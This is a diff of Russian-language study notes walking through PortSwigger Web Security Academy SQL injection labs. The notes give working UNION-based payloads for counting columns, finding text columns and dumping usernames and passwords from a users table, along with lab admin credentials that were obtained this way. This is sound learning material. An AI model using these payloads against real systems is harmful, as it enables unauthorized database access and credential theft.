@@ -34,15 +34,41 @@ https://0a7700f4032e222e80ad21a0006500f7.web-security-academy.net/?category=%27+
 administrator'-- удалось
 
 3. SQL injection UNION attack, determining the number of columns returned by the query
+Используем оператор UNION:
+вводим в URL '-- и получаем, что есть возможность для SQLi
+вводим ' UNION select NULL -> предположим, что если выдается ошибка, значит столбец не 1
+после чего подключаем Burp и передаем запрос в Repeater
+при заголовке: GET /filter?category=Gifts'%20UNION%20select%20NULL%2c%20NULL%2c%20NULL%20-- HTTP/2
+Ответ сервера - 200 ОК, значит столбца 3
+И мы решили лабу
 
+4. SQL injection UNION attack, finding a column containing text
+Используем оператор UNION: надо проверить в каком столбце у нас string data
+для начала узнаем сколько столбцов
+' UNION select NULL, NULL, NULL -- Итого 3 столбца
+далее будем проверять каждый столбец
+добавляем в запрос ' UNION select NULL, 'a', NULL -- и узнали, что второй столбец имеет данные с типом "строка"
+для решения лабы надо добавить специальный текст: ' UNION select NULL, 'z9wi0k', NULL --
 
+5. SQL injection UNION attack, retrieving data from other tables
+Сначала проверяем кол-во столбцов
+' UNION select NULL, NULL -- Их 2.
+Переходим к инъекции, используюя данные Лабы:
+' UNION select username, password from users -- 
+Появляются данные администратора:
+administrator
+cbx6574xlbbx6ff1424z
 
+6. SQL injection UNION attack, retrieving multiple values in a single column
+проверим сколько столбцов другим способом
+' order by 1 -- значит 1 столбец точно есть, и так мы выяснили что только 2 столбца, т.к. на 3-м вышла ошибка
+' UNION select NULL, 'a'-- узнаем, что там string data, и видим мы только второй столбец
+Поэтому покажем столбцы из таблицы users по очереди:
+' UNION select NULL, username from users -- показывает имена
+' UNION select NULL, password from users -- показывает пароли
 
-SQL injection attack, querying the database type and version on Oracle
-здесь у нас классическая SQL-инъекция на основе ошибок
-добавляем в запрос '
+Попробуем теперь, чтобы запрос был один
+' UNION select NULL, username || ' ' || password from users --
+administrator vq9e6n9cm0r6wjqbmpuh
 
-
-
-
-
+7. SQL injection attack, querying the database type and version on Oracle
